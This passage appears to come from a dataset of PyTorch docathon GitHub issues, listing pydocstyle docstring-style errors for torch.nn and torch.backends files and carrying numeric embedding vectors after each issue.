- **File**: `torch/nn/quantized/_reference/modules/sparse.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/utils.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/embedding_ops.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/dynamic/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/dynamic/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/intrinsic/qat/modules/conv_fused.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/intrinsic/qat/modules/linear_fused.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/intrinsic/qat/modules/linear_relu.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantizable/modules/activation.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantizable/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/cudnn/__init__.py`, **Entity**: `version`, **Line**: 69, **Description**: First line should end with a period (not 'N')
- **File**: `torch/backends/cudnn/__init__.py`, **Entity**: `version`, **Line**: 69, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/cudnn/__init__.py`, **Entity**: `is_available`, **Line**: 83, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkl/__init__.py`, **Entity**: `is_available`, **Line**: 4, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkl/__init__.py`, **Entity**: `verbose`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/mkl/__init__.py`, **Entity**: `verbose`, **Line**: 10, **Description**: First line should end with a period (not 'y')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCache`, **Line**: 38, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCache`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCache`, **Line**: 38, **Description**: First line should end with a period (not 'e')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCacheManager`, **Line**: 59, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCacheManager`, **Line**: 59, **Description**: First line should end with a period (not ',')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `preferred_linalg_library`, **Line**: 121, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `preferred_linalg_library`, **Line**: 121, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `SDPBackend`, **Line**: 173, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/openmp/__init__.py`, **Entity**: `is_available`, **Line**: 5, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkldnn/__init__.py`, **Entity**: `is_available`, **Line**: 7, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkldnn/__init__.py`, **Entity**: `verbose`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/mkldnn/__init__.py`, **Entity**: `verbose`, **Line**: 14, **Description**: First line should end with a period (not 'y')
- **File**: `torch/backends/_nnapi/prepare.py`, **Entity**: `NnapiInterfaceWrapper`, **Line**: 111, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/_nnapi/prepare.py`, **Entity**: `ShapeComputeModule`, **Line**: 151, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/_nnapi/prepare.py`, **Entity**: `ShapeComputeModule`, **Line**: 151, **Description**: First line should end with a period (not 'n')
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `ConvPoolArgs2d`, **Line**: 184, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `_do_add_binary`, **Line**: 1294, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `_do_add_binary`, **Line**: 1294, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `serialize_model`, **Line**: 2081, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `serialize_model`, **Line**: 2081, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `serialize_model`, **Line**: 2081, **Description**: First line should end with a period (not '

cc @carljparker",False,"[-8.40606615e-02 -2.46999443e-01  1.20837256e-01 -3.17128539e-01
 -2.38678277e-01 -7.47416466e-02  2.78293312e-01  1.06017068e-02
 -3.12637687e-01  1.57952726e-01  7.79749155e-02  2.15085149e-01
  3.12009990e-01  2.51916975e-01 -6.42499924e-02  3.27513725e-01
 -4.31785107e-01  6.97165877e-02 -2.25721657e-01  1.88107118e-01
  2.86447406e-01  6.00135177e-02 -2.03898653e-01  1.80524867e-03
 -2.79108107e-01  2.57621348e-01 -2.45697767e-01 -4.83600199e-02
 -5.12158088e-02  1.58468723e-01  2.62505114e-01  5.03456652e-01
 -4.61645424e-02  6.74310774e-02  3.94556642e-01  2.76117802e-01
 -2.59324163e-01 -1.64630488e-02 -3.60058025e-02  4.40579988e-02
  8.07286054e-03  2.86267512e-02 -2.20791221e-01  6.35439763e-03
 -2.34135687e-02 -2.49472022e-01 -3.19833338e-01  3.32621112e-02
 -2.21607104e-01  1.41464204e-01  5.13266176e-02  1.96385503e-01
 -7.18851268e-01 -5.69852516e-02  3.54004383e-01 -2.49490608e-02
 -1.17548391e-01  3.20550591e-01  2.03389227e-01 -1.37427628e-01
  6.42950088e-02  3.53531763e-02 -2.78580561e-02  6.00844741e-01
 -2.32422397e-01  2.02792156e-02  1.45837903e-01  2.48554349e-01
  2.37748578e-01 -2.10872084e-01  7.35531077e-02  1.43655702e-01
 -3.68871033e-01 -1.51526123e-01  1.28129035e-01  1.33445889e-01
 -4.49728101e-01 -2.31283695e-01 -2.45113730e-01 -2.16432214e-01
 -1.97035700e-01  6.27401248e-02  1.98744521e-01 -2.34970123e-01
  1.46346703e-01 -9.48066637e-03  1.26527563e-01 -3.73207331e-01
 -1.43301766e-02  5.39727286e-02  4.49542165e-01 -2.25177288e-01
 -1.79844499e-01  3.23657811e-01  3.73802423e-01  1.48259416e-01
  2.78496146e-01 -2.54468441e-01  1.55692816e-01 -1.25209205e-02
 -1.11016318e-01 -2.38039315e-01 -1.43520236e-01  1.95022479e-01
 -6.78643882e-02 -1.26373544e-01 -1.94132715e-01 -1.79149359e-01
  1.06410407e-01  1.53735146e-01  6.81898594e-02 -6.93934411e-02
  2.72785068e-01  4.91247326e-03  4.43562530e-02 -8.32886249e-02
 -1.57893538e-01  6.83180913e-02 -3.24741006e-01  1.64388508e-01
  3.33908796e-01  1.29090190e-01 -1.38987511e-01  2.41119236e-01
  2.78376997e-01  5.12661412e-02  1.01972915e-01  6.94691613e-02
  7.64820427e-02 -3.19540292e-01  3.73671860e-01 -1.73543945e-01
 -1.53962094e-02  3.06663275e-01  1.71290636e-01 -1.67955294e-01
 -3.89849186e-01 -3.10294241e-01 -2.93099046e-01  1.69001967e-01
 -5.49319208e-01 -1.02968700e-02 -1.45896778e-01 -2.88032323e-01
  5.38305402e-01  5.81914306e-01 -5.09893358e-01  2.71679282e-01
 -1.47804409e-01  4.01658595e-01 -4.15201038e-02  8.88426006e-02
 -1.67581007e-01  7.81743601e-02  3.05875279e-02  5.83388992e-02
  4.91249055e-01 -4.04576398e-03 -2.44488537e-01 -3.76314580e-01
  1.07699959e-02  2.72338510e-01 -2.02583894e-01 -1.07650250e-01
 -2.04167292e-02  2.25690790e-02 -2.39260599e-01 -2.13115990e-01
 -4.85221505e-01 -1.40021183e-03  6.55857772e-02  7.90152177e-02
 -3.39673787e-01 -2.14935187e-02  1.16090544e-01  1.31753623e-01
 -3.11420947e-01 -4.42284405e-01 -6.25143722e-02  3.18481296e-01
  6.08372092e-02  1.02880403e-01 -6.11652993e-02 -6.29734471e-02
 -9.88088250e-02  2.76634060e-02  2.41398051e-01  1.73527449e-01
 -7.59592466e-03 -4.93458025e-02 -2.36014277e-01 -2.80313760e-01
  3.63656878e-01  1.59281284e-01 -1.35517418e-01 -5.04586697e-01
  5.31274915e-01  4.86680806e-01 -4.90381494e-02  2.30022222e-01
 -2.35471889e-01  2.11480379e-01  4.98687029e-01  2.68736128e-02
  3.88528883e-01  4.45606485e-02 -4.09962296e-01 -2.38259733e-01
 -4.29402828e-01  5.38964450e-01 -4.96270448e-01 -3.86741236e-02
 -1.02300406e-01 -3.44612718e-01 -3.56814176e-01  4.27127540e-01
  1.47085115e-01  7.84244612e-02  1.22843280e-01 -5.64883828e-01
 -1.57421842e-01 -2.03352839e-01 -2.57622786e-02 -1.16798833e-01
 -4.09850776e-02  2.24526227e-01 -1.14639215e-01  2.52511799e-01
 -8.98952484e-02 -4.10058945e-02 -1.00547105e-01  4.47614565e-02
  6.83738947e-01 -1.77602172e-01  4.02113646e-01  6.73329756e-02
 -8.52246210e-02 -6.01973310e-02  7.46890604e-02  1.95813060e-01
 -2.43498832e-01  2.09569976e-01 -4.69977688e-03 -1.32352963e-01
  3.17180157e-01 -8.19622725e-02 -2.20487475e-01 -2.70060003e-01
 -2.32596666e-01 -6.53713271e-02 -6.13670647e-01 -3.56289268e-01
  2.62029529e-01 -2.27783620e-02  5.88477075e-01  5.76875918e-03
 -4.55456257e-01  1.57722197e-02  2.45878145e-01  2.26918794e-02
  1.22328967e-01  9.29538086e-02 -1.23512812e-01  4.52320904e-01
  1.30755574e-01 -9.39596891e-02 -3.59364629e-01  1.56351581e-01
  2.49261707e-01 -4.04016525e-01  1.63851112e-01 -4.76006150e-01
  6.62294030e-01 -1.70613900e-02  2.23290414e-01  1.98147371e-02
 -2.51626130e-02 -3.87380868e-01 -2.36412048e-01  1.03493057e-01
 -8.59757066e-02  1.15970403e-01 -2.77714968e-01 -4.46054079e-02
  3.07843924e-01 -4.87016961e-02 -4.38347347e-02 -1.22290671e-01
 -5.19340038e-01 -2.03825757e-01 -8.31684917e-02 -1.58777907e-02
  2.53023326e-01 -7.09587634e-02 -1.64379567e-01  2.80432463e-01
  2.50808895e-01  1.93887979e-01  4.14645910e-01 -3.08380783e-01
 -2.89910257e-01  2.23854687e-02  4.23850492e-02  3.29276234e-01
  3.30796182e-01 -1.11893918e-02  4.17952091e-01  2.85657883e-01
 -1.23626009e-01 -3.48226964e-01  4.36818123e-01  3.54135454e-01
 -2.62962908e-01  1.82008017e-02 -3.94290462e-02 -5.89963235e-03
  1.58310205e-01  4.81347024e-01  1.00277424e-01  2.08693728e-01
 -1.88384399e-01 -4.68255639e-01 -2.11672038e-01  3.92110981e-02
  1.35768831e-01 -2.21449971e-01 -1.85724854e-01  1.05018914e-01
 -2.48322994e-01 -3.98861825e-01  1.81164220e-01  2.27806613e-01
 -1.74084902e-01 -1.46409765e-01  3.71666700e-02  5.19163646e-02
 -1.75695539e-01  3.35144460e-01  1.19602464e-01 -2.98084915e-01
  2.02754755e-02  7.46941343e-02  1.58632532e-01 -2.93493271e-01
 -2.26843134e-01 -2.79322505e-01 -1.17813632e-01  4.69952613e-01
 -1.57813102e-01  1.12369522e-01  6.55803084e-01 -7.01766163e-02
 -2.02859938e-01  1.99836731e-01 -1.72880232e-01  2.08314031e-01
  2.12148912e-02  8.34585503e-02 -2.97761202e-01  4.41172123e-01
 -3.91710550e-01 -1.04448974e-01 -2.46015221e-01 -4.33900774e-01
 -9.60957259e-05 -2.76747763e-01  6.24417290e-02 -7.66475350e-02
 -1.19515657e-02  1.54991329e-01 -2.78648376e-01  3.08093786e-01
 -2.82051027e-01  2.65012458e-02  8.63381028e-02  1.14972189e-01
  1.90325692e-01  2.47982934e-01  2.26359561e-01 -6.12004362e-02
 -4.99003440e-01  3.67436290e-01  2.71949112e-01 -2.08528817e-01]"
"Fix docstring errors in weight_norm.py, parametrizations.py, prune.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/utils/prune.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/prune.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `BasePruningMethod`, **Line**: 13, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `__call__`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `__call__`, **Line**: 21, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 34, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 34, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply_mask`, **Line**: 53, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply_mask`, **Line**: 53, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 76, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 76, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 76, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `prune`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `prune`, **Line**: 207, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `prune`, **Line**: 207, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 236, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 236, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 236, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `PruningContainer`, **Line**: 266, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `add_pruning_method`, **Line**: 287, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 319, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 319, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 319, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_combine_masks`, **Line**: 347, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_combine_masks`, **Line**: 347, **Description**: First line should end with a period (not '
- **File**: `torch/nn/utils/prune.py`, **Entity**: `Identity`, **Line**: 418, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `Identity`, **Line**: 418, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 430, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 430, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 430, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 483, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 483, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 483, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `L1Unstructured`, **Line**: 500, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `L1Unstructured`, **Line**: 500, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 541, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 541, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 541, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 585, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 585, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 648, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 648, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 648, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `LnStructured`, **Line**: 667, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `LnStructured`, **Line**: 667, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 691, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 691, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 761, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 761, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 761, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 807, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 807, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 807, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `identity`, **Line**: 820, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `identity`, **Line**: 820, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `identity`, **Line**: 820, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_unstructured`, **Line**: 853, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_unstructured`, **Line**: 853, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `l1_unstructured`, **Line**: 888, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `l1_unstructured`, **Line**: 888, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_structured`, **Line**: 930, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_structured`, **Line**: 930, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `ln_structured`, **Line**: 969, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `ln_structured`, **Line**: 969, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `global_unstructured`, **Line**: 1014, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `global_unstructured`, **Line**: 1014, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `custom_from_mask`, **Line**: 1136, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `custom_from_mask`, **Line**: 1136, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 1170, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 1170, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 1170, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `is_pruned`, **Line**: 1201, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `is_pruned`, **Line**: 1201, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount_init`, **Line**: 1228, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validation')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount`, **Line**: 1262, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount`, **Line**: 1262, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount`, **Line**: 1262, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validation')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_structured_pruning`, **Line**: 1285, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_structured_pruning`, **Line**: 1285, **Description**: First line should end with a period (not '-')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_structured_pruning`, **Line**: 1285, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validation')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_nparams_toprune`, **Line**: 1304, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_nparams_toprune`, **Line**: 1304, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_dim`, **Line**: 1328, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_dim`, **Line**: 1328, **Description**: First line should end with a period (not '
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_norm`, **Line**: 1338, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_norm`, **Line**: 1338, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `_make_orthogonal`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `_make_orthogonal`, **Line**: 23, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `orthogonal`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `weight_norm`, **Line**: 309, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `spectral_norm`, **Line**: 483, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not '8')
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: `weight_norm`, **Line**: 74, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: `remove_weight_norm`, **Line**: 138, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')

cc @carljparker",False,"[-0.2198371  -0.06708594 -0.03219133 -0.08061527  0.13606101 -0.12418509
 -0.0627666   0.14131126 -0.31159288  0.10735546  0.05736128  0.08423413
  0.15168998  0.09204748 -0.15295362  0.04979009 -0.33045992 -0.3903991
  0.05491943  0.0641613   0.17312208  0.4899333  -0.05481334  0.01047971
 -0.04197233  0.12010963 -0.45970184 -0.09360582  0.16026317  0.01717637
  0.11667356  0.12368976 -0.20782943  0.02378326  0.3907135   0.23861957
 -0.22354887 -0.10486272 -0.06535725  0.20094115 -0.01778044 -0.17620575
 -0.15484142  0.03456628  0.12378668 -0.02363656 -0.20513622  0.18702689
 -0.02445241  0.10928991 -0.12772912  0.13069628 -0.1763078   0.0656503
  0.2519982  -0.03194755 -0.13170974  0.48086745  0.02222609 -0.22814173
  0.16173774  0.23441672 -0.17833331 -0.03618557 -0.01605959  0.26240063
  0.01938163  0.22593786  0.22335327  0.33822057 -0.08891099  0.10546938
 -0.40007436 -0.10885592  0.04050916  0.24939097 -0.4195118  -0.01861856
 -0.31259823 -0.3599757  -0.20663783  0.04133622 -0.02537748  0.11741641
  0.04428125 -0.09492344  0.3726707  -0.13229378  0.3288467   0.11901963
  0.36509007 -0.13149863 -0.15188837  0.3868748   0.1000574   0.2596651
 -0.21945062 -0.12332247 -0.05789138 -0.06313659  0.03086486 -0.25857472
 -0.13501509  0.15218374  0.07020654 -0.13582785  0.07499212  0.15683629
  0.11412264  0.01715882  0.1613237  -0.02301231 -0.01171762  0.12690824
  0.22687924 -0.06116181 -0.06653932 -0.07181267 -0.24313341 -0.03706657
  0.20769021  0.19828299 -0.18388121  0.12546417  0.10872139  0.01457537
  0.15989628  0.05048991  0.05567169 -0.14630434  0.11248775  0.00856772
 -0.10093687  0.14010672  0.20295459  0.15600789 -0.08397092 -0.10294323
  0.11760288  0.01663212 -0.32168365 -0.37283373 -0.2212821  -0.26745176
  0.31622314  0.28037432 -0.5035633   0.28231663  0.02085339  0.12010726
 -0.05841987 -0.02329441 -0.38040745  0.3310253  -0.00610402 -0.07905613
  0.32767966  0.07201175  0.00933147 -0.23024476 -0.06806241 -0.02269565
 -0.06954893 -0.04632572 -0.0622643   0.16303334 -0.15735745 -0.12861621
 -0.33060452 -0.07974355  0.18975447  0.0675979  -0.023588    0.09516808
  0.34254694  0.08599928 -0.15497866 -0.28483278  0.0510057   0.34181345
  0.1878563   0.45117956  0.16162866  0.04621216 -0.1795993   0.04263288
  0.16328639 -0.06444888  0.03414532  0.32305878  0.02387448 -0.24478973
  0.04719703  0.02339361 -0.20776245 -0.05074569  0.21103424  0.39907998
 -0.04224421  0.2843926  -0.30257988  0.3029204   0.31297392 -0.18063715
  0.46095204 -0.06779938 -0.447977   -0.40375376 -0.17701848  0.24883619
 -0.33187985 -0.13376462  0.04274317 -0.32239154 -0.15972531  0.30519694
  0.06373081 -0.2921635   0.18601148 -0.0088098  -0.33323115 -0.09520873
 -0.15707426 -0.27605933  0.2973005   0.13338915 -0.08336304 -0.09774661
 -0.02226643  0.01801265  0.01130928 -0.02314462  0.43442073 -0.1678549
